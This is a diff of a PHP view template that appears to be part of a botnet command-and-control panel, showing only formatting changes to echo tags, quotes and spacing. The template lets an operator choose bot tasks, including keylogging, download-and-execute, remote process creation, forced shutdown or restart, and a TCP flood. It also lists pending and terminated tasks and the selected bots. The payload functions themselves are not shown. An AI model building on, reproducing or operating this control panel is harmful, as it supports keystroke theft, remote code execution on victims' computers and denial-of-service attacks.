@@ -3,10 +3,10 @@
  * Created by PhpStorm.
  * User: Ben
  * Date: 1/20/2016
- * Time: 11:26 PM
+ * Time: 11:26 PM.
  */
 //goat::$app->registerJs($inlineJS);
-$records_per_page=3;
+$records_per_page = 3;
 ?>
 <script>
 $(function() {
@@ -65,7 +65,7 @@ $(function() {
     });
 
     //default
-    var data = <?= $helper->Keylog() ?>;
+    var data = <?php echo $helper->Keylog(); ?>;
     $(".task-data").html(data);
 
     $(".tasks").change(function(){
@@ -73,56 +73,56 @@ $(function() {
         {
             case 2:
             {
-                var data = <?= $helper->VisitUrl() ?>;
+                var data = <?php echo $helper->VisitUrl(); ?>;
                 $(".task-data").html(data);
                 break;
             }
             case 3:
             {
-                var data = <?= $helper->Shutdown() ?>;
+                var data = <?php echo $helper->Shutdown(); ?>;
                 $(".task-data").html(data);
                 break;
             }
             case 4:
             {
-                var data = <?= $helper->Restart() ?>;
+                var data = <?php echo $helper->Restart(); ?>;
                 $(".task-data").html(data);
                 break;
             }
             case 5:
             {
-                var data = <?= $helper->MessageBox() ?>;
+                var data = <?php echo $helper->MessageBox(); ?>;
                 $(".task-data").html(data);
                 break;
 
             }
             case 6:
             {
-                var data = <?= $helper->Keylog() ?>;
+                var data = <?php echo $helper->Keylog(); ?>;
                 $(".task-data").html(data);
                 break;
             }
             case 8:
             {
-                var data = <?= $helper->downloadExecute() ?>;
+                var data = <?php echo $helper->downloadExecute(); ?>;
                 $(".task-data").html(data);
                 break;
             }
             case 9:
             {
-                var data = <?= $helper->createRemoteProcess() ?>;
+                var data = <?php echo $helper->createRemoteProcess(); ?>;
                 $(".task-data").html(data);
                 break;
             }
             case 10:
             {
-                var data = <?= $helper->tcpFlood() ?>;
+                var data = <?php echo $helper->tcpFlood(); ?>;
                 $(".task-data").html(data);
                 break;
             }
             case 11:
             {
-                var data = <?= $helper->downloadExecute() ?>;
+                var data = <?php echo $helper->downloadExecute(); ?>;
                 $(".task-data").html(data);
                 break;
             }
@@ -179,11 +179,11 @@ $(function() {
 </script>
 
 <div class="alpha-container container-fluid">
-    <?= $header ?>
+    <?php echo $header; ?>
     <div class="container-fluid col-lg-10" style="margin-right: 0; background-color: white; margin-top: 1em;">
         <?php
-        $result = goat::$app->getFlash("_result");
-        echo (!empty($result)) ? $result : null;
+        $result = goat::$app->getFlash('_result');
+        echo (! empty($result)) ? $result : null;
         ?>
             <div class="row">
                 <div class="group-box" style="height: 22em;">
@@ -253,7 +253,9 @@ $(function() {
             <div class="row">
                 <div class="group-box task-data">
                     <?php
-                    if(!empty($log)) echo '<textarea id="log" cols="90" rows="4" placeholder="Logs will be seen here..."></textarea>';
+                    if (! empty($log)) {
+                        echo '<textarea id="log" cols="90" rows="4" placeholder="Logs will be seen here..."></textarea>';
+                    }
                     ?>
                 </div>
             </div>
@@ -276,14 +278,14 @@ $(function() {
                             </thead>
                             <tbody>
                             <?php
-                            $paginate->tableName = "p_page_no";
+                            $paginate->tableName = 'p_page_no';
                             $newquery = $paginate->paging($pending, $records_per_page);
                             $paginate->dataview($newquery);
                             ?>
                             </tbody>
                         </table>
                         <div class="col-lg-9 col-md-9 col-sm-12" style="bottom: 0;">
-                            <?= $paginate->paginglink($pending,$records_per_page) ?>
+                            <?php echo $paginate->paginglink($pending, $records_per_page); ?>
                         </div>
                     </div>
                     <div id="menu1" class="tab-pane fade">
@@ -299,14 +301,14 @@ $(function() {
                             </thead>
                             <tbody>
                             <?php
-                            $paginate->tableName = "t_page_no";
+                            $paginate->tableName = 't_page_no';
                             $newquery = $paginate->paging($terminated, $records_per_page);
                             $paginate->dataview($newquery);
                             ?>
                             </tbody>
                         </table>
                         <div class="col-lg-9 col-md-9 col-sm-12" style="bottom: 0;">
-                            <?= $paginate->paginglink($terminated,$records_per_page); ?>
+                            <?php echo $paginate->paginglink($terminated, $records_per_page); ?>
                         </div>
                     </div>
                 </div>
@@ -318,24 +320,22 @@ $(function() {
                         <li><a tabindex="-1" href="#" class="cancel_task">Cancel Command</a></li>
                     </ul>
                 </div>
-                <?php $_bots = goat::$app->getFlash("_bots", true); ?>
+                <?php $_bots = goat::$app->getFlash('_bots', true); ?>
                 <table class="table table-striped table-hover table-condensed" style="font-size: small">
                     <thead>
                     <tr>
                         <div class="panel panel-default">
-                            <div class="panel-heading" href="#" data-toggle="collapse" data-target="#botselected" aria-expanded="false" aria-controls="botselected" style="line-height: 1.5em;">Selected Bots&nbsp&nbsp<span class="badge"><?= count($_bots) ?></span></div>
+                            <div class="panel-heading" href="#" data-toggle="collapse" data-target="#botselected" aria-expanded="false" aria-controls="botselected" style="line-height: 1.5em;">Selected Bots&nbsp&nbsp<span class="badge"><?php echo count($_bots); ?></span></div>
                         </div>
                     </tr>
                     </thead>
 
                     <?php
-                    if(isset($_bots) && is_array($_bots) && !empty($_bots[0]))
-                    {
+                    if (isset($_bots) && is_array($_bots) && ! empty($_bots[0])) {
                         echo '<tbody class="collapse" id="botselected">';
-                        foreach($_bots as $bots)
-                        {
+                        foreach ($_bots as $bots) {
                             //echo "<input type='hidden' name='bots[]' value='". $bots ."' />";
-                            echo '<tr><td>'. $bots .'</td></tr>';
+                            echo '<tr><td>'.$bots.'</td></tr>';
                         }
                         echo '</tbody>';
                     }
